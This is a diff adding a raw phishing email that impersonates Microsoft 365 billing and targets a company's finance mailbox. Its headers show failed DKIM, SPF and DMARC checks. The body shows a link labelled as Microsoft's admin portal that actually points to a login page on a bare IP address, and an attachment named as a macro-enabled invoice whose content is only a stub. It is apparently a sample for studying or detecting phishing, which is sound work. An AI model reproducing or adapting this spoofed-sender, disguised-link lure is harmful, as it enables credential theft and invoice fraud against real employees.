@@ -1,0 +1,41 @@
+Return-Path: <mailer-daemon@bulk-relay-882.xyz>
+Received: from unknown-vps-194.bulk-relay-882.xyz (185.220.101.44)
+	by mx.enterprise-mail.org with SMTP id z88192aa90
+	for <finance@enterprise-mail.org>; Sun, 22 Nov 2026 15:42:19 +0000
+Received: from WIN-DESKTOP-99 (91.214.124.18)
+	by unknown-vps-194.bulk-relay-882.xyz with ESMTP id 11920c
+	for <finance@enterprise-mail.org>; Sun, 22 Nov 2026 15:38:01 +0000
+Authentication-Results: mx.enterprise-mail.org;
+	dkim=fail reason="signature verification failed" header.i=@microsoft.com;
+	spf=fail (enterprise-mail.org: domain of billing@microsoft.com does not designate 185.220.101.44 as permitted sender) smtp.mailfrom=mailer-daemon@bulk-relay-882.xyz;
+	dmarc=fail (p=REJECT sp=REJECT) header.from=microsoft.com
+From: "Microsoft 365 Billing Support" <billing@microsoft.com>
+Reply-To: "Accounts Receivable" <remittance-desk@secure-invoice-verify.top>
+To: finance@enterprise-mail.org
+Subject: URGENT: Overdue Enterprise License Invoice #INV-90482 - Action Required
+Date: Sun, 22 Nov 2026 15:38:00 +0000
+Message-ID: <9918273645@WIN-DESKTOP-99>
+X-Mailer: PHPMailer 6.5.0
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BOUNDARY_SEC_991"
+
+--BOUNDARY_SEC_991
+Content-Type: text/html; charset="UTF-8"
+
+<html>
+<body>
+<p>Dear Customer,</p>
+<p>Your Microsoft 365 Enterprise tenant subscription is suspended due to an unpaid invoice.</p>
+<p>Please review and settle your balance immediately via our billing portal:</p>
+<p><a href="http://185.220.101.44/microsoft-login/verify-account.php">https://admin.microsoft.com/billing/invoices</a></p>
+<p>Alternatively, download the attached remittance statement.</p>
+</body>
+</html>
+
+--BOUNDARY_SEC_991
+Content-Type: application/octet-stream; name="Invoice_90482_Statement.xlsm"
+Content-Disposition: attachment; filename="Invoice_90482_Statement.xlsm"
+Content-Transfer-Encoding: base64
+
+UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAA=
+--BOUNDARY_SEC_991--
